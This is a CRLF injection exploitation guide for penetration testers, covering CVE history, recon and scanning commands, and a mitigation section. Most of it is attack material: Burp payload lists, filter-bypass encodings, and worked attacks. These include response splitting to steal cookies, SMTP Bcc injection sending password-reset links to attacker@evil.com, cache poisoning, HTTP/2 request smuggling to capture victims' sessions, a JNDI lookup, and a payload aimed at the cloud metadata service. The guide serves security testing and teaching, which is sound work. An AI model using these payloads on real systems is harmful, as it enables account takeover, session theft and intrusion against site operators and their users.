# CRLF Injection: Complete Exploitation Methodology

## Table of Contents

1. Understanding CRLF Injection
2. How CRLF Injection Works
3. Real-World Vulnerabilities and Exploits (Past to Present)
4. Complete Testing Methodology
5. Tools and Configuration
6. Step-by-Step Exploitation Examples
7. Framework-Specific Vulnerabilities
8. Mitigation and Prevention

---

## 1. Understanding CRLF Injection

CRLF injection is a vulnerability that relies on the misuse of two special characters: Carriage Return (CR, represented by `\r` or `%0d`) and Line Feed (LF, represented by `\n` or `%0a`). Together, they indicate to many computer systems that a new line should begin. Web servers interpret the CRLF sequence as a line break, which separates HTTP headers and marks the end of the header section .

A CRLF injection occurs when an attacker can inject these characters into a part of the system that does not expect them. If the application does not validate or encode them correctly, an attacker can alter the normal functioning of a request or response by "breaking" the structure intended by the server and inserting unwanted content .

---

## 2. How CRLF Injection Works

HTTP uses CRLF sequences for two critical purposes:
- To separate individual headers (`Header: Value\r\n`)
- To mark the end of the header section (`\r\n\r\n`)

When an application echoes user input into HTTP responses without proper sanitization, an attacker can inject CRLF characters to:

1. Terminate the current HTTP header
2. Inject new HTTP headers
3. Split the HTTP response into multiple responses
4. Control the content the browser parses

**Example Attack Vector:**
```
http://www.example.com/page?param=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```

This injected payload creates a fake HTTP response that the browser processes instead of the legitimate content .

---

## 3. Real-World Vulnerabilities and Exploits (Past to Present)

### IBM Lotus Domino (CVE-2012-3301)

In 2012, IBM Lotus Domino 8.5.x was discovered to have multiple CRLF injection vulnerabilities in its HTTP server. Remote attackers could inject arbitrary HTTP headers and conduct HTTP response splitting attacks through crafted input involving Mozilla Firefox 3.0.9 and earlier versions or unspecified browsers .

**Impact:** Attackers could manipulate HTTP responses, potentially leading to cache poisoning and cross-site scripting.

### FlatNuke 2.5.5 (CVE-2005-2540)

This early example demonstrated CRLF injection leading to remote command execution. Attackers could inject carriage return characters in the signature field, which was injected into a PHP script without proper sanitization, allowing PHP code execution via direct request .

### Axios CVE-2026-40175 (March 2026)

A critical vulnerability was discovered in the Axios HTTP client, which is downloaded over three billion times annually and present in approximately 80% of cloud and code environments. The vulnerability stems from Axios's lack of HTTP header sanitization and default SSRF capabilities .

**Technical Details:** If an attacker can pollute `Object.prototype` via any other library in the stack (e.g., qs, minimist, ini, body-parser), Axios automatically picks up the polluted properties during its config merge. Because Axios does not sanitize merged header values for CRLF characters, the polluted property becomes a request smuggling payload .

**Important Note:** While the vulnerability exists at the library level, exploitation in standard Node.js environments is limited because Node.js's built-in HTTP client rejects CRLF characters in headers. However, applications using custom Axios adapters that bypass Node's HTTP client remain vulnerable .

### Microsoft .NET CRLF Injection (CVE-2023-36049)

A vulnerability in .NET's FTP functionality allowed CRLF injection leading to arbitrary file write and deletion. This demonstrates that CRLF injection affects not just web applications but also other protocols like FTP .

### HTTP/2 Request Smuggling via CRLF Injection (PortSwigger Lab)

Modern attacks leverage HTTP/2's unique characteristics. When front-end servers downgrade HTTP/2 requests to HTTP/1.1, insufficient sanitization of incoming headers can enable CRLF injection. Attackers can inject `\r\n` sequences into HTTP/2 headers using Burp Suite's Inspector by pressing Shift+Return .

---

## 4. Complete Testing Methodology

### Phase 1: Reconnaissance and Target Identification

**Step 1: Identify Potential Injection Points**

All user-controllable input that might be reflected in HTTP responses must be tested:
- URL parameters (both GET and POST)
- HTTP request headers (User-Agent, Referer, X-Forwarded-For, etc.)
- Cookie values
- File upload names
- Form input fields

**Step 2: Subdomain Enumeration**

```
# Using multiple tools for comprehensive subdomain discovery
amass enum -d target.com -o subdomains.txt
subfinder -d target.com -o subdomains.txt
sublist3r -d target.com -o subdomains.txt

# Combine and sort unique results
cat subdomains.txt | sort -u > all_subdomains.txt
```

**Step 3: Parameter Discovery**

```
# Use waybackurls to find historical parameters
cat all_subdomains.txt | waybackurls | tee historical_urls.txt

# Fuzz for additional parameters
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
ffuf -u https://target.com/FUZZ -w wordlist.txt
```

### Phase 2: Manual Testing for CRLF Injection

**Basic Payload Testing**

Inject CRLF sequences followed by a unique identifier to verify injection:

```
https://target.com/page?param=test%0d%0aX-Injected-Test:12345
```

**Using cURL for Manual Verification:**

```bash
# Test for reflected injection
curl -I "https://target.com/search?q=test%0d%0aX-Custom-Injected:true"

# Test with multiple encoding variations
curl -I "https://target.com/page?input=%0d%0aSet-Cookie:injected=1"
curl -I "https://target.com/page?input=%0aSet-Cookie:injected=1"
curl -I "https://target.com/page?input=%0dSet-Cookie:injected=1"
```

**Observation Points:**
- Check if `X-Injected-Test` appears in response headers
- Look for new `Set-Cookie` headers
- Monitor for response splitting (multiple HTTP responses in one)

### Phase 3: Automated Scanning

**Using CRLFuzz:**

```bash
# Basic scan
crlfuzz -u "https://target.com/page?param=FUZZ"

# Scan from file
crlfuzz -l urls.txt -o results.txt

# With custom headers
crlfuzz -u "https://target.com/search?q=FUZZ" -H "User-Agent: CRLFuzz" -t 50
```

**Using CRLF Injection Scanner:**

```bash
crlf_scan.py -i target_urls.txt -o vulnerable_urls.txt
```

**Using CRLFMap for Large-Scale Testing:**

```bash
crlfmap scan --domains domains.txt --output results.txt --threads 100
```

### Phase 4: Burp Suite Configuration and Testing

**Setting Up Burp Suite for CRLF Detection:**

1. **Proxy Configuration:**
   - Configure browser to use Burp proxy (127.0.0.1:8080)
   - Install Burp's CA certificate

2. **Intruder Payload Configuration:**
   - Send a request with a parameter to Intruder
   - Set payload position where CRLF will be injected
   - Load CRLF payload list

3. **HTTP/2 Testing (Critical for Modern Applications):**
   - In Repeater, expand the Inspector's Request Attributes section
   - Ensure protocol is set to HTTP/2
   - Add arbitrary header, then append `\r\n` to its value
   - Use Shift+Return to inject newlines (not available when double-clicking) 

**Burp Suite Intruder Payload List:**

```
%0d%0aSet-Cookie:injected=1
%0aSet-Cookie:injected=1
%0dSet-Cookie:injected=1
%0d%0a%0d%0a<script>alert(1)</script>
%0d%0aLocation:https://evil.com%0d%0a
%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0aContent-Length:19%0d%0a%0d%0a<html>Hacked</html>
```

**Using Burp Scanner:**
1. Right-click on request → Do an active scan
2. Burp automatically tests for CRLF injection in parameters
3. Review issues in Target → Site map → Issues tab

---

## 5. Tools and Configuration

### Essential Tools Summary

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| CRLFuzz | Fast CRLF scanning | `crlfuzz -u "https://target.com?q=FUZZ"` |
| CRLF Injection Scanner | Comprehensive scanning | `crlf_scan.py -i urls.txt -o results.txt` |
| CRLFMap | Large-scale domain scanning | `crlfmap scan --domains domains.txt` |
| Burp Suite | Manual and automated testing | Configure Intruder with payloads |
| cURL | Command-line verification | `curl -I "https://target.com?x=%0d%0aX:y"` |

### Payload Variations for Filter Bypass

**Standard CRLF:**
```
%0d%0a
%0a
%0d
```

**Double Encoded:**
```
%250d%250a
%250a
%250d
```

**Unicode Variations:**
```
%u000d%u000a
\u000d\u000a
```

**With Comment Characters:**
```
%23%0d%0a
%3f%0d%0a
%2e%2e%2f%0d%0a
```

**Mixed Case (for case-sensitive filters):**
```
%0D%0A
%0d%0A
%0D%0a
```

**Cloudflare Bypass Example:**
```
<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">
```

---

## 6. Step-by-Step Exploitation Examples

### Example 1: HTTP Response Splitting Leading to XSS

**Scenario:** A web application echoes the `page` parameter in the `Location` header.

**Step 1: Identify vulnerable parameter**
```
GET /redirect?page=home HTTP/1.1
Host: vulnerable.com

Response:
HTTP/1.1 302 Found
Location: /home
Content-Length: 0
```

**Step 2: Test CRLF injection**
```
GET /redirect?page=home%0d%0aX-Test:injected HTTP/1.1
Host: vulnerable.com

Response (if vulnerable):
HTTP/1.1 302 Found
Location: /home
X-Test: injected
Content-Length: 0
```

**Step 3: Craft response splitting payload**
```
GET /redirect?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<script>alert(document.cookie)</script> HTTP/1.1
Host: vulnerable.com
```

**Step 4: The browser receives and processes:**
- First response: `Location: ` followed by CRLF
- Second response (injected): `HTTP/1.1 200 OK` with XSS payload
- Browser ignores original content due to Content-Length: 0

### Example 2: SMTP Header Injection for Account Takeover

**Scenario:** A password reset feature sends emails based on user-provided email address .

**Vulnerable Request:**
```json
POST /api/forgot-password HTTP/2
Host: vulnerable.com

{"email":"user@example.com"}
```

**Legitimate SMTP Generation:**
```
From: no-reply@vulnerable.com
Subject: Password Reset
To: user@example.com
```

**Attack Payload:**
```json
POST /api/forgot-password HTTP/2
Host: vulnerable.com

{"email":"user@example.com\r\nCc: attacker@evil.com"}
```

**Resulting SMTP Headers:**
```
From: no-reply@vulnerable.com
Subject: Password Reset
To: user@example.com
Cc: attacker@evil.com
```

**Impact:** The attacker receives the password reset link and can compromise the account.

**More Discreet Attack Using Bcc:**
```json
{"email":"user@example.com\r\nBcc: attacker@evil.com"}
```

### Example 3: Log Injection for Log Forgery

**Scenario:** An application logs user activity including the `X-User-Id` header .

**Vulnerable Logging:**
```java
// Spring Boot application with Log4J2
logger.info("User {} accessed {}", userId, endpoint);
```

**Attack Request:**
```
GET /search HTTP/2
Host: vulnerable.com
X-User-Id: 789-123%0d%0aGET 200 /admin 5.48.16.120 Unauthenticated
```

**Corrupted Log Output:**
```
HTTP verb   HTTP status   Endpoint     Client-IP       X-User-Id
GET         200           /home        5.50.81.190     123-456
PATCH       200           /user        5.50.81.190     123-456
GET         200           /search      5.50.81.190     789-123
GET         200           /admin       5.48.16.120     Unauthenticated
```

**Impact:** Attackers can hide their malicious activity by injecting fake log entries, leading to:
- Wasted incident response resources
- False attribution of attacks
- Undetected malicious activity

### Example 4: HTTP Header Injection for Cache Poisoning

**Goal:** Poison a reverse proxy cache to serve malicious content to all users.

**Step 1: Identify cacheable endpoint**
```
GET /articles/123 HTTP/1.1
Host: vulnerable.com
```

**Step 2: Inject cache-poisoning payload**
```
GET /articles/123%0d%0aHost:%20evil.com%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2050%0d%0a%0d%0a<html>Hacked%20by%20attacker</html> HTTP/1.1
Host: vulnerable.com
```

**Step 3: When cache stores the response:**
- The injected `Host: evil.com` header makes the cache key different
- The second response becomes the cached content
- All users receive the malicious page

### Example 5: HTTP/2 Request Smuggling (PortSwigger Lab)

This attack exploits HTTP/2's feature where headers can contain newlines .

**Step 1: Send request to Repeater and switch to HTTP/2**
Using Burp Inspector, set protocol to HTTP/2.

**Step 2: Inject CRLF into header value**
Add header with name `foo` and value:
```
bar\r\nTransfer-Encoding: chunked
```

**Step 3: Smuggle request in body**
```
0

POST / HTTP/1.1
Host: vulnerable.com
Cookie: session=YOUR-SESSION
Content-Length: 800

search=x
```

**Step 4: Capture victim's request**
When victim accesses the page, their request gets appended to the smuggled prefix. The next response contains their session cookie.

---

## 7. Framework-Specific Vulnerabilities

### Spring Boot with Log4J2

Spring Boot applications using Log4J2 are vulnerable to CRLF injection in logging if user input is logged without sanitization .

**Vulnerable Code:**
```java
@RestController
public class HelloController {
    private static final Logger logger = LogFactory.getLog(HelloController.class);
    
    @GetMapping("/")
    public String hello(@RequestParam String name) {
        logger.info("User accessed: " + name);
        return "Hello " + name;
    }
}
```

**Attack:**
```bash
curl "http://localhost:8080/?name=Marty%0d%0a1985-10-30%2021%3A59%3A01.108%20DEBUG%20128537%20---%20%5Bnio-8080-exec-1%5D%20net.example.logging.HelloController%20%20%20%20%20%20%3A%20You%20have%20been%20pwnd%0A"
```

**Chaining with JNDI Injection:**
```bash
# Start listener
ncat -v -l -p 5000

# JNDI LDAP lookup via CRLF
curl "http://localhost:8080/?name=%24%7Bjndi%3Aldap%3A%2F%2Flocalhost%3A5000%7D"
```

### Axios (Node.js)

**Vulnerable Pattern:**
```javascript
// Attacker achieves prototype pollution elsewhere
Object.prototype['x-amz-target'] = "dummy\r\n\r\nPUT /latest/api/token HTTP/1.1\r\n" +
  "Host: 169.254.169.254\r\n" +
  "X-aws-ec2-metadata-token-ttl-seconds: 21600\r\n\r\nGET /ignore";

// Normal application code
axios.get("https://internal.service");
```

**Fix Implemented in v1.15.0:** Axios now throws an error if headers contain CRLF characters.

### .NET Framework

CVE-2023-36049 demonstrated CRLF injection in .NET's FTP functionality allowing arbitrary file operations .

**Vulnerable Context:**
- FTP commands sent to server
- User-controlled filenames with CRLF characters
- Results in arbitrary file write/delete

---

## 8. Mitigation and Prevention

### Input Validation

**Never trust user input** that will be placed in HTTP headers. Implement strict validation:

```java
// Java - Reject invalid characters
if (input.contains("\r") || input.contains("\n")) {
    throw new IllegalArgumentException("Invalid characters");
}
```

```python
# Python - Validate before use
if '\r' in user_input or '\n' in user_input:
    raise ValidationError("CR/LF characters not allowed")
```

```javascript
// Node.js - Sanitize headers
const sanitized = userInput.replace(/[\r\n]/g, '');
res.setHeader('X-Custom', sanitized);
```

### Output Encoding

Encode CR and LF characters so they are never interpreted as line breaks:

```java
// Using Apache Commons Text
StringEscapeUtils.escapeJava(userInput);

// Custom encoding
userInput = userInput.replace("\r", "\\r").replace("\n", "\\n");
```

### Safe API Usage

Avoid constructing HTTP headers directly from user input. Use framework features that automatically handle encoding:

```php
// Vulnerable
header("Location: /redirect?page=" . $_GET['page']);

// Fixed - Validate and encode
$page = str_replace(["\r", "\n", "%0d", "%0a"], '', $_GET['page']);
header("Location: /redirect?page=" . $page);
```

### Framework-Level Protections

**Modern frameworks often include built-in protections:**

- **Express.js:** The `res.setHeader()` method does not automatically sanitize; manual sanitization required
- **Spring Boot:** Use `HtmlUtils.htmlEscape()` or `StringEscapeUtils.escapeHtml4()`
- **Django:** Template auto-escaping protects against XSS but not header injection

### WAF Configuration

Configure Web Application Firewalls to block CRLF sequences:

```
# ModSecurity rule example
SecRule ARGS "[\r\n]" "id:123456,deny,msg:'CRLF Injection Attempt'"
```

### Regular Scanning

Integrate vulnerability scanning into CI/CD pipeline:

```bash
# Automated weekly scans
crlfuzz -l production_urls.txt -o weekly_scan_results.txt

# GitHub Actions integration
name: CRLF Scan
on: [push]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - name: Run CRLFuzz
        run: crlfuzz -l urls.txt -o results.txt
```

### Security Headers

Implement security headers to reduce impact:
```
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src 'self'
```

---

## Summary Checklist for Pentesters

| Phase | Action |
|-------|--------|
| Recon | Identify all parameters reflected in responses |
| Manual Test | Inject `%0d%0aX-Test:1` and verify reflection |
| Automated | Run CRLFuzz, CRLFMap, and Burp Scanner |
| HTTP/2 | Test using Burp Inspector with Shift+Return |
| Exploitation | Chain with XSS, cache poisoning, or account takeover |
| Reporting | Document injection point, payload, and impact |

---

## References

- CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers
- OWASP: CRLF Injection
- PortSwigger: HTTP/2 Request Smuggling via CRLF Injection Lab
- CVE-2026-40175: Axios HTTP Header Sanitization Vulnerability
- CVE-2012-3301: IBM Lotus Domino CRLF Injection
- CVE-2023-36049: Microsoft .NET CRLF Injection
